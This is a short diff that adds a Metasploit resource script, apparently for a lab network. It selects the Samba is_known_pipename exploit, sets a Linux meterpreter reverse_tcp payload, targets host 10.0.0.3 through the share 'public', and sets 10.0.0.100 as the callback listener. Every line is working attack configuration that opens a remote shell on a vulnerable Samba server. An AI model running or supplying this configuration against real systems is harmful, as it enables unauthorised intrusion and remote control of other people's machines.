@@ -1,0 +1,6 @@
+use exploit/linux/samba/is_known_pipename
+set TARGET 3
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set RHOSTS 10.0.0.3
+set SMB_SHARE_NAME public
+set LHOST 10.0.0.100
